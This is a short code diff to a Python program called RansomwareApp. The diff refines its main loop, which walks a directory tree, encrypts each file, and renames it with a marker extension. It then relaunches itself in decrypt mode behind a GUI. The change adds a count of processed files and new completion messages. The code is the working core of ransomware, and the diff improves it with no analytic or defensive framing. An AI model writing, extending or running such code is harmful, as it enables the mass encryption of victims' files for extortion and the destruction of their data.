@@ -88,17 +88,23 @@ class RansomwareApp:
         discoverer = FileDiscoverer(root_dir)
         files = discoverer.discover_files()
         logger.info(f"Processing {len(files)} files in {root_dir}")
+        processed = 0
         for file in files:
             try:
                 if encrypt and not file.endswith(extension):
                     self.encryptor.encrypt_file(file)
                     os.rename(file, file + extension)
+                    processed += 1
                 elif not encrypt and file.endswith(extension):
                     self.encryptor.decrypt_file(file)
                     os.rename(file, file[:-len(extension)])
+                    processed += 1
             except Exception as e:
                 logger.error(f"Failed to process {file}: {e}")
-        logger.info("Processing complete.")
+        if encrypt:
+            logger.info(f"Encryption complete. Total files encrypted: {processed}")
+        else:
+            logger.info(f"Decryption complete. Total files decrypted: {processed}")
         # Launch GUI after encryption
         if encrypt:
             decrypt_cmd = [sys.executable, sys.argv[0], "-p", root_dir, "-d"]
